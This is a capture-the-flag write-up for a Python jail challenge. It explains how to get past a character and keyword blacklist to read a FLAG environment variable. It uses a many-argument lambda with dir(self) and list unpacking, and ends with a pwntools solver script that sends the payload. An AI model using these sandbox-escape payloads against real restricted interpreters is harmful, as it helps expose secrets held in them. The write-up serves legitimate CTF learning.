# Stressful reader

## Description

I want to read an env variable, but I'm getting stressed out because of that blacklist!!! Would you help me plz? :(

## Solution


Looking at the source code, it's clear that we have to use the method `get_var`
to read the `FLAG` env variable. After taking a quick look to `badchars` we also
see that the characters F, L, A, G are blacklisted, so we have to find another
way to compose the word, and it's *highly probable* that `self.F`, `self.L`,
`self.A`, `self.G` can be used for this purpouse.

As usual with pyjails, to start it's a good idea to look at what we are left with.
A little script can help us to see what builtins, special keywords and
characters are able to pass the blacklist.

```py
badchars = [ 'c', 'h', 'j', 'k', 'n', 'o', 'p', 'q', 'u', 'w', 'x', 'y', 'z'
           , 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N'
           , 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W'
           , 'X', 'Y', 'Z', '!', '"', '#', '$', '%'
           , '&', '\'', '-', '/', ';', '<', '=', '>', '?', '@'
           , '[', '\\', ']', '^', '`', '{', '|', '}', '~'
           , '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']


badwords = ["aiter", "any", "ascii", "bin", "bool", "breakpoint"
           , "callable", "chr", "classmethod", "compile", "dict"
           , "enumerate", "eval", "exec", "filter", "getattr"
           , "globals", "input", "iter", "next", "locals", "memoryview"
           , "next", "object", "open", "print", "setattr"
           , "staticmethod", "vars", "__import__", "bytes", "keys", "str"
           , "join", "__dict__", "__dir__", "__getstate__", "upper"]


builtins = ["abs()", "aiter()", "all()", "anext()", "any()", "ascii()", "bin()", "bool()", "breakpoint()", "bytearray()", "bytes()", "callable()", "chr()", "classmethod()", "compile()", "complex()", "delattr()", "dict()", "dir()", "divmod()", "enumerate()", "eval()", "exec()", "filter()", "float()", "format()", "frozenset()", "getattr()", "globals()", "hasattr()", "hash()", "help()", "hex()", "id()", "input()", "int()", "isinstance()", "issubclass()", "iter()", "len()", "list()", "locals()", "map()", "max()", "memoryview()", "min()", "next()", "object()", "oct()", "open()", "ord()", "pow()", "print()", "property()", "range()", "repr()", "reversed()", "round()", "set()", "setattr()", "slice()", "sorted()", "staticmethod()", "str()", "sum()", "super()", "tuple()", "type()", "vars()", "zip()", "__import__()"]

keywords = ["False", "await", "else", "import", "pass", "None", "break", "except", "in", "raise", "True", "class", "finally", "is", "return", "and", "continue", "for", "lambda", "try", "as", "def", "from", "nonlocal", "while", "assert", "del", "global", "not", "with", "async", "elif", "if", "or", "yield"]


print("=== Available builtins ===")

for b in builtins:
    if (all(x not in b for x in badchars) and (b not in badwords)):
        print(b)

print("=== Available keywords ===")

for k in keywords:
    if (all(x not in k for x in badchars) and (k not in badwords)):
        print(k)

print("=== Available chars ===")

for i in range(32,256):
    if (chr(i) not in badchars):
        print(chr(i))
```


Keeping in mind that we want to use the object variables to compose "FLAG", we
see that we have some useful functions to access the object properties, like
`dir()`. Also, we have the characters to form `self.get_var()`, which is *really
good*.

Since we have the source code, we can run the jail locally with the blacklist
check removed to look at the output of `print(dir(self))` (we have to remove the
blacklist since in the actual jail `print` is blacklisted):

```py
# run locally after removing the blacklist
> print(dir(self))
['A', 'F', 'G', 'L', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getstate__', '__gt__', '__hash__', '__init__
', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_
_weakref__', 'get_var', 'run_code']
```

So, `dir(self)` (which we can use) gives us the list of the names of the
object's properties. If we can find a way to access them and compose 'FLAG', we
are done. We don't have an easy way of accessing the list elements, since
numbers are blacklisted. The crucial point here is to realize that we have not
only builtin functions, but also some special characters like '+' or '\*' that
in python have a special meaning: '+' is also the string concatenation operator,
and '*' can be used to [unpack a list](https://treyhunner.com/2018/10/asterisks-in-python-what-they-are-and-how-to-use-them/)
in many positional arguments for a function. This means that we can form 'FLAG'
following this idea:

```py
> def win(arg1, arg2, ..., argn):
     return arg1 + arg3 + arg0 + arg2

> win(*dir(self))
  'FLAG'
```

But of course we can't write all that stuff in the jail... or can we? We can use
a `lambda` function!

`dir(self)` has 33 elements, so we need a function that takes 33 arguments and
performs the concatenation of the ones corrisponding to 'FLAG'. We can use the
permutations of the chars 'f','l','a','g','s' (or any of the available chars) to
form the name of the arguments, and this can be done easily with a script.

The final payload would look like this:

```py
> self.get_var((lambda flags,flasg,flgas,flgsa,flsag,flsga,falgs,falsg,fagls,fagsl,faslg,fasgl,fglas,fglsa,fgals,fgasl,fgsla,fgsal,fslag,fslga,fsalg,fsagl,fsgla,fsgal,lfags,lfasg,lfgas,l
fgsa,lfsag,lfsga,lafgs,lafsg,lagfs: flasg + flgsa + flags + flgas)(*dir(self)))

snakeCTF{7h3_574r_d1d_7h3_j0b}
```

After all this stress, we finally got the flag!


### Solver

```py

#!/usr/bin/env python3

from pwn import *
from itertools import permutations

context.log_level = 'error'

HOST = args.HOST if args.HOST else "localhost"
PORT = args.PORT if args.PORT else 12003

r = remote(HOST, PORT)

params = []
perm = list(permutations("flags"))

for i in range(33):
    params.append(''.join(perm[i]))

payload = f"self.get_var((lambda {','.join(params)}: {params[1]} + {params[3]} + {params[0]} + {params[2]})(*dir(self)))"
print(payload)

r.sendlineafter(b"> ", payload.encode('ascii'))
print(r.recvline().decode())
```
